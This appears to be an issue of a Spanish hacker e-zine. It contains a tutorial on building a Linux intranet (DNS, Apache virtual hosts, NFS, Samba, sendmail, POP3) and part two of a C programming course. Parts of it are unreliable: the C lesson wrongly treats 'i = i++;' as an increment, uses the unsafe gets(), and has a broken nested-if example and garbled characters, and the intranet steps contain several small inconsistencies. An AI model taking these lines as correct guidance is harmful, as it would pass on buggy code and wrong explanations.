 

 *. Hardware:
    ---------
 - HUB/Swicht (Opcional en el caso de utilizar Cable Coaxial).
 - Cable UTP Nivel 5 o Cable Coaxial. 
 - Conectores RJ-45 o Terminator (BNC) con sus Respectivas "T" y Tapones.
 - Ponchador.
 - Canaletas y Cajetines Simples (En el Caso de Montar una Intranet Elegante).
 
  
    
    
 Bueno, si me falto algo pues agamelo saber, Ok. Despues de haber instalado
 el software necesario, procedemos a configurar nuestro servidor.
 

 3. Configuracion de el Servidor y los Clientes 
    -------------------------------------------
 
  Ok, debemos  definir  que  rango  de  IP's vamos a utilizar, asi  como  el
  broadcast y el tipo de dominio (puede ser cualquiera, ya  que  no  vamos a
  tener salida a la INET). Por Ejemplo:
  
  Dominio: elquesea.com
  Rango de IP's: 192.168.0.1/254
  Broadcast: 192.168.0.255
  Netmask: 255.255.255.0
     
  Ok, entonces quedaria asi nuestra Intranet:
  
  Servidor Linux:
  ---------------
  Dominio: Servidor.elquesea.com
  IP: 192.168.0.1
  Broadcast: 192.168.0.255
  Netmask: 255.255.255.0

  Cliente Linux:
  ---------------
  Dominio: ws01.elquesea.com
  IP: 192.168.0.2
  DNS: 192.168.0.1
  Broadcast: 192.168.0.255
  Netmask: 255.255.255.0
   
  Cliente Windows 1:
  -----------------
  Dominio: ws02.elquesea.com
  IP: 192.168.0.3
  DNS: 192.168.0.1
  Broadcast: 192.168.0.255
  Netmask: 255.255.255.0

  Cliente Windows 2:
  -----------------
  Dominio: ws03.elquesea.com
  IP: 192.168.0.4
  DNS: 192.168.0.1
  Broadcast: 192.168.0.255
  Netmask: 255.255.255.0
  
  NOTA: Hay que denotar que el servidor DNS va a ser 192.168.0.1 y por lo
        tanto los cliente deben tener esa IP como DNS Primario.


 4. Configuracion de el Servidor DNS
    --------------------------------

 Bueno, ahora  vamos  a configurar los  DNS para  los Clientes y para  el
 Mismo Servidor, lo que temos que hacer es  entar  en /var/named/ (En  mi
 caso porque  utilizo  Mandrake, y  esto  puede  variar dependiendo  a la
 distribucion  de Linux  que  utilicemos),    creamos   los    siguientes
 ficheros:  db-192.168.0  y db.elquesea.com, luego  editamos  el  archivo
 el  archivo  db.elquesea.com y  escribimos lo siguientes:
 
                         -------- Empieza Aqui ----------                      
[++] Intranet/named/db.elquesea.com
 @	IN	SOA	servidor.elquesea.com.	root.servidor.elquesea.com. (
		2000110203 ; serial
		28800 ; refresh
		7200 ; retry
		604800 ; expire
		86400 ; default_ttl
		)

 localhost		IN	A	127.0.0.1
 servidor.elquesea.com.	IN	A	192.168.0.1
 ws01			IN	A	192.168.0.2
 ws02			IN	A	192.168.0.3
 ws03			IN	A	192.168.0.4
 ftp			IN	CNAME	servidor
 pop			IN	CNAME	servidor
 smtp 			IN	CNAME	servidor
 www			IN	CNAME	servidor
 @			IN	MX	10	servidor.elquesea.com.
 @			IN	NS		servidor.elquesea.com.
[--]

 
                          ------ Termina Aqui --------                       
  
 
 Ahora Editamos el fichero db-192.168.0 y escribimos lo siguiente:


                         -------- Empieza Aqui ----------                          
[++] Intranet/named/db-192.168.0
 @	IN	SOA	servidor.elquesea.com.	root.servidor.elquesea.com. (
			2000110205 ; serial
			28800 ; refresh
			7200 ; retry
			604800 ; expire
			86400 ; default_ttl
			)
 1		IN	PTR	servidor.elquesea.com.
 2		IN	PTR	ws01.elquesea.com.
 3		IN	PTR	ws02.elquesea.com.
 4		IN	PTR	ws03.elquesea.com.
[--]

                          ------ Termina Aqui --------                       
 

 Creamos en /var/named un archivo llamado named.local y incluimos lo
 siguiente:
 

                         -------- Empieza Aqui ----------
[++] Intranet/named/named.local
 @		IN	SOA	localhost.	root.localhost. (
			2000110202 ; serial
			28800 ; refresh
			14400 ; retry
			3600000 ; expire
			86400 ; default_ttl
			)
 1		IN	PTR	localhost.
 @		IN	NS	localhost.
[--]

                          ------ Termina Aqui --------                       
 
  Creamos en /etc un archivo llamado named.conf y incluimos lo siguiente:
 
                         -------- Empieza Aqui ----------                          
[++] Intranet/named/named.conf
options {
    directory "/var/named";
};
zone "." {
	type hint;
	file "named.ca";
};
zone "elquesea.com"{
	type master;
	file "db.elquesea.com";
};
zone "0.0.127.IN-ADDR.ARPA"{
	type master;
	file "named.local";
};
zone "0.168.192.IN-ADDR.ARPA"{
	type master;
	file "db-192.168.0";
};
[--]
                          ------ Termina Aqui --------                       
 
 Listo, ahora editamos el archivo /etc/resolv.conf y le decimos que el DNS
 se apunte a si mismo agregandole:

 search servidor.elquesea.com
 nameserver 127.0.0.1
 nameserver 192.168.0.1

 Y para el cliente con Linux le decimos:
 search servidor.elquesea.com
 nameserver 192.168.0.1
 

 Ahora configuramos los Dos clientes con  Windows (Me imagino  que eso si lo 
 saben  hacer), si  no  lo  saben, pues metasen en google.com y busquenlo  o
 sino busque al tecnico mas sercano.

 Luego, arrancamos el demonio del named  y verificamos  los  DNS  y nos debe 
 aparecer lo siguiente:
 
 # nslookup servidor.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    servidor.elquesea.com
 Address:  192.168.0.1

 # nslookup ws01.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws01.elquesea.com
 Address:  192.168.0.2

 # nslookup ws02.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws02.elquesea.com
 Address:  192.168.0.3

 # nslookup ws03.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws02.elquesea.com
 Address:  192.168.0.4


 Probando los Alias (pop,smtp,www)
 ---------------------------------
 # nslookup pop.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    servidor.elquesea.com
 Address:  192.168.0.1
 Aliases:  pop.elquesea.com
 
 # nslookup smtp.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    servidor.elquesea.com
 Address:  192.168.0.1
 Aliases:  smtp.elquesea.com
 
 # nslookup www.elquesea.com
 Server:  localhost
 Address:  127.0.0.1

 Name:    servidor.elquesea.com
 Address:  192.168.0.1
 Aliases:  www.elquesea.com


 Probando las Reversas de IP's
 -----------------------------
 # nslookup 192.168.0.1
 Server:  localhost
 Address:  127.0.0.1

 Name:    servidor.elquesea.com
 Address:  192.168.0.1

 # nslookup 192.168.0.2
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws01.elquesea.com
 Address:  192.168.0.2

 # nslookup 192.168.0.3
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws02.elquesea.com
 Address:  192.168.0.3

 # nslookup 192.168.0.4
 Server:  localhost
 Address:  127.0.0.1

 Name:    ws03.elquesea.com
 Address:  192.168.0.4

 Ok, luego de esto ya tenemos montado nuestro servidor DNS.

 NOTA: Si Usted llega a inluir una  o  mas maquinas  a su  Intranet, debe 
       configurarla en su DNS,  asignarle  una  IP  y  luego reiniciar el
       demonio del named, haciendo "ndc restart".
       

 5. Configuracion de el Servidor Web
    --------------------------------
 
 Aqui nos encontramos con una duda, quien va alojar  las web para cada uno
 de los  clientes?; tenemos  dos  opciones, donde  la  primera  opcion  es
 instalarle a cada uno de los cliente un Servidor Web (Apache), pero  esto
 traeria mas trabajo y es inecesario, ahora, simplemente  nos vamos  a  la
 opcion dos que es que el servidor aloje nuestras  web  para  cad a uno de
 nuestros  clientes ... pero  ustedes  diran, y  como  hago  eso?, es  muy
 sencillo,  configuramos  el  apache  del   servidor  con  algo  se  llama
 "VirtualHost",  simplemente   le  decimos  que  apunte  el  subdominio (o
 dominio) que queremos a un directorio virtual, Ok

 Veamos:
 
 Lo primero  que debes hacer es crear un directorio en el /home llamado web/,
 y darle  la permisiologia  correcta a el, luego debemos crear dentro de web/
 unos directorios que se llamen asi: servidor.elquesea.com, ws01.elquesea.com
 ws02.elquesea.com y ws03.elquesea.com.
 
 NOTA: hay que denotar que el cliente (o los cliente con Linux) no necesitan
f       virtualhost, simplemente  hay que  configurarlo  de  manera de que el 
       dominio apunte a la IP y listo.
 
 Luego lo que tenemos que hacer es irnos a /etc/httpd/conf/vhost y editar el
 archivo  Vhost.conf  (esto  puede  variar  en la  distribucion de Linux que 
 utilices).
 
 Ahora lo que hacemos es agregarle el siguiente codigo al archivo:
 

                         -------- Empieza Aqui ----------

[++] Intranet/httpd/Vhost.conf
################# Home
NameVirtualHost 192.168.0.1
<VirtualHost 192.168.0.1>
ServerName servidor.elquesea.com
ServerPath /home/web/servidor.elquesea.com
DocumentRoot /home/web/servidor.elquesea.com
ScriptAlias /cgi-bin/ /home/web/servidor.elquesea.com/cgi-bin/
</VirtualHost>

################# WorkStation 01 (ws01) - Linux
NameVirtualHost 192.168.0.1
<VirtualHost 192.168.0.1>
ServerName ws01.elquesea.com
ServerPath /home/web/ws01.elquesea.com
DocumentRoot /home/web/ws01.elquesea.com
ScriptAlias /cgi-bin/ /home/web/ws01.elquesea.com/cgi-bin/
</VirtualHost>

################# WorkStation 02 (ws02) - Windows 9x
NameVirtualHost 192.168.0.1
<VirtualHost 192.168.0.1>
ServerName ws02.elquesea.com
ServerPath /home/web/ws02.elquesea.com
DocumentRoot /home/web/ws02.elquesea.com
ScriptAlias /cgi-bin/ /home/web/ws02.elquesea.com/cgi-bin/
</VirtualHost>

################# WorkStation 03 (ws03) - Windows 9x
NameVirtualHost 192.168.0.1
<VirtualHost 192.168.0.1>
ServerName ws03.elquesea.com
ServerPath /home/web/ws03.elquesea.com
DocumentRoot /home/web/ws03.elquesea.com
ScriptAlias /cgi-bin/ /home/web/ws03.elquesea.com/cgi-bin/
</VirtualHost>
[--]
                          ------ Termina Aqui --------                       
 
 Listo, ahora nos queda reiniciar el demonio del httpd y abrir nuestro
 browser para ver las paginas.
 


 6. Configuracion de un Servidor de NFS
    -----------------------------------
 Lo siguiente es configurar un servidor de NFS (Network File System) para los
 cliente con Linux, pero  para  ello debemos configurar el nivel de seguridad
 para  portmap. Esto  se  consigue  editando  los ficheros /etc/hosts.allow y 
 /etc/hosts.deny. Debemos especificar que  direcciones IP's  pueden acceder a 
 los servicios de portmap y quienes no pueden hacerlo. De la  siguiente forma 
 (/etc/host.allow):

 portmap:192.168.0.0/255.255.255.0

 Esto  corresponde  a la direccion IP de la red completa  y la  mascara de la 
 subred. Tambien   podemos  especificar  direcciones   IP   individuales  sin 
 necesidad de establecer una mascara.

 portmap:192.168.0.0/255.255.255.0
 portmap:192.168.0.4
 portmap:192.168.1.1 (Si hemos pasado de 254 IP's)

 Luego, editamos el archivo /etc/host.deny y agregamos la siguiente Linea:

 portmap:ALL
 
 Con esto le daremos un nivel de seguridad medio a nuestro sistema.
 Simplemente nos queda reiniciar el deminio del portmap con:
 
 #portmap restart


 Luego procederemos a crear un directorio para compartir nuestros archivos
 con:

 # mkdir /home/nfs/

 Agregamos en el archivo /etc/exports la siguiente Linea:

 /home/nfs	ws01.miredlocal.org(ro)

 Donde (ro) es solo-lectura, si se desea compartir el volumen de "escritura", 
 enconces colocamos (rw)

 Ahora solo queda reiniciar el nfs (o iniciarlo) con

 #nfs start
 #nfs restart


 *.- Configurando las miquinas clientes
     ----------------------------------

 Simplemente creamos como root el siguiente directorio en nuestro cliente 
 con Linux:

 # mkdir /mnt/nfs-server
 
 Y para montar el volumen remoto, utilizaremos la siguiente linea de comando:

 # mount -t nfs servidor.elquesea.com:/home/nfs /mnt/nfs
-server
 
 Si por alguna razon le llega a dar  error, entonces  compruebe de que su DNS
 esta funcionando como debe ser sino configure  el  archivo /etc/host con las
 IP's y sus respectivos alias en  cada  uno de los Clientes con Linux. Ahora, 
 tambien podemos montarlo con la IP de servidor, pr ejemplo:

 # mount -t nfs 192.168.1.254:/home/nfs /mnt/nfs-server

 
 TIPS: Si queremos montarlo con una simple linea de comandos, entonces agrege 
 en el archivo /etc/fstab lo siguiente:

 servidor.elquesea.com:/home/nfs  /mnt/nfs-server nfs user,exec,dev,nosuid,rw,noauto 0 0



 7. Configuracion de un Servidor SAMBA
    ----------------------------------

 Bueno, ahora vamos a  configurar  SAMBA, pero  ustedes  diran (perdon a los 
 Gurus), que es eso?, eso or casualidad no es  una  galleta   con  una  capa 
 de Chocolate?, pues no, es SMB (Session   Message  Block)  llamado  tambien 
 Protocolo  NETBios  o   LanManager y   nos  sirve  para  compartir ficheros 
 CASI TRANSPARENTEMENTE entre Linux y Windows.


 Lo  Primero  que tenemos que hacer es definir en el /etc/lmhosts
 el alias
 de cada una de las maquinas, por ejemplo:

 127.0.0.1	localhost
 192.168.0.1    servidor
 192.168.0.3    ws02
 192.168.0.3    ws03

 Ahora Editaremos el archivo smb.conf y cambiaremos nuestro grupo de trabajo 
 como:

 workgroup = MIREDLOCAL

 
 Luego descomentamos la siguiente lineas y le indicamos un nivel de seguridad 
 medio con:

        hosts allow = 192.168.0. 10.

 Para evitar que Windows nos este registrando cada vez que tratemos de entar
 al directorio compartido, simplemente descomentamos esta lineas:

        encrypt passwords = Yes
        smb passwd file = /etc/smbpasswd

 Ahora si nuestra red local va  a  tener  una impresora (que este conectada)
 en el  servidor, simplemente  le  damos los parametros a SAMBA para que los
 clientes con Windows puedan utilizarlos con:

 [printers]
        comment = Impresora.
        path = /var/spool/samba
        printable = Yes
        browseable = No
        public = yes

 Ahora simplemente le indicamos a SAMBA que comparta los directorios Home
 con:
 
 [homes]
   comment = Directorios Home
   browseable = no
   writable = yes


 Listo, despues de esto simplemente nos queda reiniciar el demonio del SAMBA.



 8. Configuracion de un Servidor de Correos
    ---------------------------------------


 Ahora nos queda por modificar el archivo /etc/mail/sendmail.mc, y para ello, 
 simplemente agregamos o modificamos las siguienetes lineas:

 MAILER(smtp)
 MAILER(local)
 DOMAIN(`servidor.elquesea.com')dnl
 
 NOTA: La Ruta /etc/mail/sendmail.mc puede variar dependiendo de tu 
       distribucion.

 Ahora compilamos con:

 m4 /etc/mail/sendmail.mc > /etc/sendmail.cf


 Editamos el archivo /etc/mail/access y agregamos algunas lineas para definir 
 quienes  podran  hacer  uso  de nuestro servidor de correo para poder enviar 
 mensajes:

[++] Intranet/sendmail/access
 # by default we allow relaying from localhost...
 localhost.localdomain		RELAY
 localhost			RELAY
 127.0.0.1			RELAY
 servidor.elquesea.com		RELAY
 ws01.elquesea.com		RELAY
 ws02.elquesea.com		RELAY
 ws03.elquesea.com		RELAY
[--]

 Ahora hay que compilar para el formato del Sendmail con:

 # cd /etc/mail
 # make clean
 # make

 Ahora simplemente nos queda reiniciar el demonio del sendmail con 
 
 # sendmail restart 

 
 Para poder recuperar el correo desde los otros clientes, editamos el archivo 
 /etc/inetd.conf y descomentamos la siguiente linea:

 pop-3   stream  tcp     nowait  root    /usr/sbin/tcpd	ipop3d

 
 Ahora solo nos queda reiniciar el demonio inetd con "inetd restart".


 *.- Configuracion de los clientes de correos
     ----------------------------------------
    
 Si  la  red local esta bien configurada, solo nos queda configurar nuestro
 cliente de correo favorito (pine, kmail para Linux) o Outllok para Windows,
 con la siguiente:
    
 POP3: pop.elquesea.com
 SMTP: smtp.elquesea.com
 LOGIN: tu_login
 PASSWORD: tu_p4zzw0rd
 
 y Listo, ya hemos montado una Intranet con Los Servicios Basicos.
 
 NOTA: Tiene que tener una cuenta en el servidor para poder enviar/recibir el
       correo; con su respectivo Login y Password.
    
 9. Otros Servicios
    ---------------

 En  nuestro  servidor podemos  configurar otros servicios para la Intranet, 
 como es  de  IRC (Montar un  Servidor  para Charlas), Servidor de Juegos en
 Red (Quake), Servidor de PPP, Servidor  de  Base  de  Datos, etc. Para  eso 
 deben buscar la respectiva documentacion.
 
 
10. Conclusiones y Recomendaciones
    ------------------------------
    
 Bueno, espero  que  les  sirva este articulo, tambien les recomiendo de que 
 se leean la documentacion completa (HOWTO's) de los cuales resaltan en este
 articulo:
 
 - Samba-HOWTO
 - WWW-HOWTO
 - Mail-Administration-HOWTO
 - NFS-HOWTO
 - DNS-HOWTO
 - Guia del Administrador de redes con Linux
 
 Este articulo es base para montar una Intranet con salida a Internet, se
 puede modificar agregandole lo siguiente:
 
 - Servidor Proxy
 - IPCHAINS (2.2.x) o IPTABLES (2.4.x)
 - IP-Masquerade 
 - PPP
 - Fetchmail
 
 Tambien les recomiendo  que  se leean la documentacion de el qmail (se puede 
 decir que es su substituto),  es mas facil de configurar y de administrar, y
 lo pueden conseguir en: http://es.qmail.org.
 
 Otra de las cosas es que esten actualizando su software continuamente, ya que
 cada dia van saliendo bugs nuevos y  muchas personas se pueden aprobechar de 
 esos bugs para penetrar tu sistema (esta recomendacion  te  la doy por si tu 
 intranet tiene salida a internet). Para encontrar la Informacion actualizada, 
 puedes visitar:
 
 http://www.securityfocus.com
 http://packetstorm.securify.com
 http://www.hackernews.com
 http://www.microsoft.com
 http://www.slashdot.org
 http://www.freshmeat.net
 http://www.barrapunto.com   (En espa~ol)
 http://www.linuxpreview.org (En espa~ol)
 http://www.0ri0n.org        (En espa~ol) ;)

 
 Flames y otras basura enviarlas a /dev/null, comentarios "constructivos"
 y otras recomendaciones a mailto:kl0nk@0ri0n.org

 Esto es todo Amigos, nos vemos en el proximo articulo, Enjoy ;)



-[ 2x08 ]--------------------------------------------------------------------
-[ Como programar en C en muchos pasos (II) ]-------------------[ El_Max_5 ]-
---------------------------------------------------------[ max-5@0ri0n.org ]-


 Saludos, nos volvemos a ver en esta segunda entrega, bueno, en esta segunda
 parte  de este curso de programacion en C vamos a trabajar con los  que  es
 Operadores, Sentencias de Control y Funciones, Cualquier Pregunta,  Opinion
 Referencia, Correccion enviarmela por correo, Ok ... Bueno Empecemos ...

 II.- Operadores y Sentencias de Control
      ----------------------------------

 1.- Operadores
     ----------

 Existen  siete  tipos de operadores: aritmeticos, relacionales, logicos, de
 negacion, de incremento, de decremento y de bits.

 a.- Aritmeticos
     -----------

  Son:

      *       multiplicacion
      /       division
      +       suma
      -       resta
      %       division en modulo


 Los cuatro primeros actuan de acuerdo a lo se~alado. El quinto da el resto
 de la division de dos enteros.

 Ejemplo:
 -------

 #include <stdio.h>
 #include <stdlib.h>

 main()
 {
   double fgrados, cgrados;
   char respuesta[128];

   printf("Conversion de grados Fahrenheit a grados Celsius\n\n");
   printf("Grados Fahrenheit? ");
   gets(respuesta);
   fgrados = atof(respuesta);
   cgrados = ((fgrados - 32.0) * 5.0) / 9.0;
   printf("Grados Celsius = %f\n", cgrados);
   return 0;
 }

 Para su uso en expresiones debera tomarse en cuenta su precedencia:

 (a + b * c) = (a + ( b * c ))
 (a + b * c) ? ((a +  b ) * c))


 b.- Operadores Relacionales
     -----------------------
 Producen cierto (?????o falso (0) como resultado. Son:

 <       >       ==
 <=      >=      !=

 Tienen un nivel de precedencia menor que los operadores aritmeticos. Es asi
 que 10 > 1+ 12 se evalua como 10 > (1+12) y da por resultado un falso.

 c.- Operadores Logicos
     ------------------

 Son && y || y combinan las expresiones relacionales de acuerdo al "y" logico
 y "o" logico:

 (A < B) && (B < C)              cierto si A < B y B < C
 (A < B) || (B < C)              cierto si A < B o B < C


 d.- Operador Negacion
     -----------------

 Invierte el resultado de cualquier expresion logica. Es un operador unitario

 !( A< B) es equivalente a A >= B


 e.- Operadores de Incremento ++ y Decremento --
     -------------------------------------------

 En vez de usar:

 i = i + 1;

 puede usarse:

 i = i++;

 De la misma manera:

 i = i - 1;

 puede sustituirse por:

 i = i--;

 Ademas:

 j = i++;

 asigna el valor no modificado de "i" a "j" e incrementa el valor de "i" de 1.
 Si el valor de "i" es 7, al ejecutarse esta sentencia "j" vale 7 e i 8. Si se
 coloca el operador antes de la variable:

 j = ++i;

 i y j tendran el mismo valor. Es decir que:

 j = i ++; equivale a: j = i; i++;

 mientras que:

 j = ++i; a: ++i; j = i;

 Ejemplo:

 1       #include <stdio.h>
 2
 3       main()
 4       {
 5         int a, b, c, v, k;
 6
 7         printf("Teclear un valor entero: ");
 8         scanf("%d", &v);
 9         k = v;
 10        printf("\n     Antes   Durante  Despues\n");
 11        v = k; a = v; b = v++; c = v; printf("v++%8d%8d%8d\n", a, b, c);
 12        v = k; a = v; b = v--; c = v; printf("v--%8d%8d%8d\n", a, b, c);
 13        v = k; a = v; b = ++v; c = v; printf("++v%8d%8d%8d\n", a, b, c);
 14        v = k; a = v; b = --v; c = v; printf("--v%8d%8d%8d\n", a, b, c);
 15        return 0;
 16      }

 En este programa  la  linea 8  permite  leer el  valor decimal  del  entero
 tecleado  y  almacenarlo  en  v. La expresion &v  pasa  la direccion de v a
 scanf(). A excepcion  de  las  cadenas, los  argumentos tienen  siempre que
 pasarse a scanf() por su direccion.


 f.- Operadores de Asignacion
     ------------------------

 Se usan en vez de los operadores aritmeticos para ayudar al compilador en la
 generacion de un codigo mas eficiente:

 cuenta += 10            /* cuenta = cuenta + 10 */
 cuenta *= 2             /* cuenta = cuenta * 2 */
 cuenta /= 3             /* cuenta = cuenta / 3 */
 cuenta %= 16            /* cuenta = cuenta % 16 */


 g.- Precedencias
     ------------

 La tabla siguiente resume las precedencias entre los operadores del C Nivel
 Operadores: 

 ---------------------------------------------------------------------------
 | Nivel |    Operadores                         |    Orden de Evaluacion  |
 ---------------------------------------------------------------------------
 |  1    |   () . []                             |    izquierdo a derecha  |
 |  2    |   * & ! - ++ -- + - (molde) sizeof    |    derecha a izquierda  |
 |  3    |   * / %                               |    izquierdo a derecha  |
 |  4    |   + -                                 |    izquierdo a derecha  |
 |  5    |   << >>                               |    izquierdo a derecha  |
 |  6    |   < <= > >=                           |    izquierdo a derecha  |
 |  7    |   == !=                               |    izquierdo a derecha  |
 |  8    |   &                                   |    izquierdo a derecha  |
 |  9    |   ^                                   |    izquierdo a derecha  |
 | 10    |  |                                    |    izquierdo a derecha  |
 | 11    |  &&                                   |    izquierdo a derecha  |
 | 12    |  ||                                   |    izquierdo a derecha  |
 | 13    |  ? :                                  |    derecha a izquierda  |
 | 14    |  = *= /= += -= %= <<= >>= &= ^= |=    |    derecha a izquierda  |
 | 15    |  ,                                    |    izquierdo a derecha  |
 ---------------------------------------------------------------------------



 2.- Sentencias de Control
     ---------------------

 a.- Sentencia if
     ------------

 Su forma general es:  if (expresion) sentencia;

 Si la expresion es cierta (??????entonces se ejecuta la sentencia?

 Puede tambien usarse:

 if (expresion) {
	sentencia1;
	sentencia2;
 }

 if (expresion == valor) {
	sentencia1;
	sentencia2;
 }

 Ejemplo:

 1       #include <stdio.h>
 2
 3       main()
 4       {
 5         int numero;
 6         int okay;
 7
 8         printf("Teclear un numero entre 1 y 10: ");
 9         scanf("%d", &numero);
 10        okay = (1 <= numero) && (numero <= 10);
 11        if (!okay)
 12        printf("Respuesta incorrecta!\n");
 13        return okay;
 14      }

 La linea 10  asigna a okay el  resultado, cierto o falso de (1<= numero) &&
 (numero <= 10). Okay contiene entonces  0  o un  valor  diferente  de 0.

 La linea 11 examina la expresion !okay. Si okay es igual a falso, !okay es
 igual a cierto y se produce el mensaje de error de la linea 12.

 Se podria haber utilizado:

 if ((1 <= numero) && (numero<=10))
         printf("Este numero no puede aceptarse !\n");

 b.- La sentencia else
     ----------------- 

 Puede usarse para ejecutar otra alternativa:

 if (expresion)
	sentencia1;
 else
	sentencia2;


 Podemos tener tambien:

 if (expresion) {
	sentencia1;
	sentencia2;
 } else {
	sentencia3;
	sentencia4;
 }

 Podemos anidar los ifs:

 if (expresion1) {
	sentencia1;
	sentencia2;
 else if (expresion2) {
	sentencia3;
	sentencia4;
 } else {
	sentencia5;
	sentencia6;
 }

 Sin embargo, para  mayor  claridad  no  es recomendable  abusar de  los if's
 anidados.

 Ejemplo:


#include <stdio.h>
main()
{
   int bisiesto;
   int an;

   printf("Detector de a~o bisiesto\n");
   printf("A~o? ");
   scanf("%d", &an);
   if (an > 0) {
    if ((an % 100) == 0)
      bisiesto = ((an % 400) == 0);
    else
      bisiesto = ((an %   4) == 0);
    if (bisiesto)
      printf("%d es un a~o bisiesto\n", an);
    else
      printf("%d no es un a~o bisiesto\n", an);
   }
   return 0;
}


 JUEGO: El ejemplo presenta un error. Trate de corregirlo.


#include <stdio.h>

main()
{
 int numero;

 printf("Numero (1 ... 10)? ");
 scanf("%d", &numero);
 if (numero >= 1)
   if (numero > 10)
    printf("Error: numero > 10\n");
 else
    printf("Error: numero < 1\n");
 return 0;
}


 En C existe  una regla  muy  sencilla. La  sentencia else  se refiere al if
 precedente mas proximo  que no tenga asociada una sentencia else.

 Otra  regla  importante  es  que  nunca  debe confiarse en  la sangria  para
 controlar la logica de un programa.


 c.- Expresion Condicional
     ---------------------

 En vez de usar:
 if (expresion1)
        expresion2;
 else
        expresion3;

 puede utilizarse:

 expresion1 ? expresion2 : expresion3;

 Por ejemplo:

 if (selecMenu == 'S')
	valor = 100;
 else
	valor = 0;

 se sustituye por:

 valor = (selecMenu == 'S') ? 100 : 0;

 La  ventaja de usar  esta expresion es que se evita tener dos referencias de
 la misma variable.


 d.- Sentencia switch
     ----------------

 Esta representa una alternativa al uso de los ifs anidados. Su forma general
 es:

 switch (expresion) {
	case val1:
		sentencia1;
		break;
 case val2:
		sentencia2;
		break;
 case val3:
		sentencia3;
		break;
	default:
		sentenciaPorDefecto;	
 }

 La sentencia break permite salir de inmediato del switch. Si no  se  pusiera
 despues de sentencia2, se ejecutarian todas las sentencias que siguen a case
 val2:, es decir las sentencias sentencia2 , sentencia3 y sentenciaPorDefecto.
 Algunos  programadores  se  aprovechan  de  esto y omiten colocar un break a
 proposito para que se ejecuten varias sentencias del switch. Sin embargo, se
 desaconseja esta practica.

 Ejemplo:

 1       #include <stdio.h>
 2       #include <ctype.h>
 3
 4       main()
 5       {
 6         int selec;
 7
 8         printf("Menu: A(gregar B(orrar S(ortear Sa(lir: ");
 9         selec = toupper(getchar());
 10        switch (selec) {
 11          case 'A':
 12            printf("Selecciono Agregar\n");
 13            break;
 14          case 'B':
 15            printf("Selecciono Borrar\n");
 16            break;
 17          case 'S':
 18            printf("Selecciono Sortear\n");
 19            break;
 20          case 'L':
 21            printf("Selecciono Salir\n");
 22            break;
 23          default:
 24            printf("\nSeleccion Ilegal !!!\n");
 25        }
 26        return selec;
 27      }

 La  linea 9  llama a una funcion getchar() que lee un caracter tecleado. La
 funcion toupper() convierte el caracter a mayuscula.

 e.- Sentencia while
     ---------------

 Constituye  una  de las  tres sentencias  que permiten  crear  un bucle para
 repetir una accion. Su forma general es:

 while (expresion) {
	sentencia1;
	sentencia2;
	........
 }

 Cada sentencia se ejecuta repitidas veces mientras  la expresion  es cierta.
 Debe, por  consiguiente, existir  una sentencia  que  afecte el valor  de la
 expresion para que se termine de ejecutar el bucle.

 Ejemplo:
 1       #include <stdio.h>
 2
 3       main()
 4       {
 5         int contador;
 6
 7         printf("contador con while\n");
 8         contador = 1;
 9         while (contador <= 10) {
 10          printf("%d\n", contador);
 11          contador++;
 12        }
 13        return 0;
 14      }

 La  linea 8 inicializa el valor de la variable de control  contador mientras 
 que la linea 11 la incrementa, asegurando asi que la sentencia termine.

 Agregar  una  linea  para  chequear  el valor  de contador cuando termina la
 sentencia while.

 Verificar  lo  que pasa  si la expresion es (contador < 10) asi como  si  se
 inicializa el contador con el valor 11.

 Esta ultima prueba ilustra una propiedad importante de la sentencia while:
 no se ejecuta si la expresion de control es inicialmente falsa.

 Ejemplo:


 #include <stdio.h>

 main()
 {
  int c;

  printf("alfabeto con while\n");
  c = 'A';
  while (c <= 'Z') {
    printf("%c", c);
    c++;
  }
  return 0;
 }



 f.- Sentencia do - while
     --------------------

 Su forma general es:
 do {
	sentencia1;
	sentencia2;
	.......
 } while (expresion);

 Esta  sentencia  se ejecuta  completamente por lo menos  una  vez ya que  la
 expresion de control se chequea a final del bucle.

 Ejemplo:


#include <stdio.h>
main()
{
   int contador;

   printf("contador con do-while\n");
   contador = 0;
   do 
   {
     contador++;
     printf("%d\n", contador);
   } while (contador < 10);
   return 0;
}


 Agregar  una  linea  para chequear  el  valor  del  contador  en  posiciones
 estrategicas. Observar que en este caso la expresion (contador < 10) termina
 correctamente  el  bucle  despues  de mostrar el decimo valor. Es importante
 entender el porque en este caso la expresion (contador <= 10) no funcionaria.

 Ejemplo:


#include <stdio.h>
main()
{
   int c;

   printf("alfabeto con do-while\n");
   c = 'A' - 1;
   do {
     c++;
     printf("%c", c);
   } while (c < 'Z');
   return 0;
}


 g.- Sentencia for
     -------------

 Cuando se conoce o cuando el programa puede calcular el numero de veces que
 debe ejecutarse la sentencia es preferible usar una sentencia for. Su forma
 general es:

 for (expresion1; expresion2 ; expresion3) {
	sentencia;
 }

 Ejemplo:

 for (i = 1; i <= 10; i++)
         printf("i == %d\n",i);

 lo que es equivalente a:

 i = 1;
 while ( i <= 10) {
	printf("i == %d\n",i);
	i++;
 }

 Ejemplo:

 1       #include <stdio.h>
 2
 3       main()
 4       {
 5         unsigned char c;
 6
 7         for (c = 32; (c < 254); c++) {
 8           if ((c % 32) == 0) printf("\n");
 9           printf("%c", c);
 10        }
 11        printf("\n");
 12        return 0;
 13      }

 En la linea 7 se inicializa la variable de  control c al  valor ASCII 32, es
 decir  un  blanco. Cuando el resto de la  division  de  c  por 32  es  0, la
 sentencia if provoca un cambio de linea.

 La sentencia for (;;) ; permite crear  un bucle  infinito  que  se terminara
 solamente  cuando un  evento  externo, tal  como, una  se~al de interrupcion,
 obliga al procesador a ejecutar algun otro codigo.


 h.- Sentencia break
     ---------------

 Permite interrumpir un bucle while, do - while o for en ejecucion.

 Ejemplo:


 #include <stdio.h>

 main()
 {
   int contador;

   printf("\n\nbucle for:\n");
   for (contador = 1; contador <= 10; contador++) {
     if (contador > 5) break;
     printf("%d\n", contador);
   }

   printf("\n\nbucle while:\n");
   contador = 1;
   while (contador <= 10) {
     if (contador > 5) break;
     printf("%d\n", contador);
     contador++;
   }

   printf("\n\nbucle do/while:\n");
   contador = 1;
   do {
     if (contador > 5) break;
     printf("%d\n", contador);
     contador++;
   } while (contador <= 10);

   return 0;
 }

